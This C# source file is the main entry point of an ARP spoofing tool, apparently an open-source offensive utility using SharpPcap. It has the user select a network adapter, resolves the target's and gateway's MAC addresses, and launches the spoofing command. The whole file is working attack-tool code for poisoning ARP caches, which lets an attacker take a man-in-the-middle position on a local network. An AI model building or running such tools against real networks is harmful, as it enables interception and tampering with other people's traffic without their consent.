using System.Threading.Tasks;
using ArpSpoof.Commands;
using ArpSpoof.Core;
using System.Net.NetworkInformation;
using SharpPcap;
using System.Net;

class Program
{
    static string ASCIIART = @"
   ___   ___  ___  ____  ____________  _  __
  / _ | / _ \/ _ \/ __ \/  _/ __/ __ \/ |/ /
 / __ |/ , _/ ___/ /_/ // /_\ \/ /_/ /    /
/_/ |_/_/|_/_/   \____/___/___/\____/_/|_/
By github.com/joaostack
";

    /// <summary>
    /// ArpSpoof Program
    /// </summary>
    /// <param name="targetAddress"></param>
    /// <param name="gatewayAddress"></param>
    static async Task Main(string targetAddress, string gatewayAddress)
    {
        Console.ForegroundColor = ConsoleColor.DarkGray;
        Console.WriteLine(ASCIIART);
        Console.ResetColor();

        if (string.IsNullOrEmpty(gatewayAddress) || string.IsNullOrEmpty(targetAddress))
        {
            Console.WriteLine("-?, -h, --help\tShow help and usage information");
            return;
        }

        try
        {
            var cts = new CancellationTokenSource();
            var ct = cts.Token;

            // Open Device select menu
            var device = DeviceHelper.SelectDevice();
            DeviceHelper.OpenDevice(device);

            // Get Gateway MAC Address
            var gatewayMac = PhysicalAddress.Parse(await PacketBuild.GetMacAddress(device, gatewayAddress, ct));
            Console.WriteLine(gatewayMac.ToString());

            // Get Target MAC Address
            var targetMac = PhysicalAddress.Parse(await PacketBuild.GetMacAddress(device, targetAddress, ct));
            Console.WriteLine(targetMac.ToString());

            // Instantiate ArpSpoofCommands
            var cmd = new ArpSpoofCommands(device, IPAddress.Parse(targetAddress), targetMac, IPAddress.Parse(gatewayAddress), gatewayMac);
            cmd.Execute();

            device.Close();
        }
        catch (Exception ex)
        {
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine(ex.Message);
        }
        finally
        {
            Console.ResetColor();
        }
    }
}
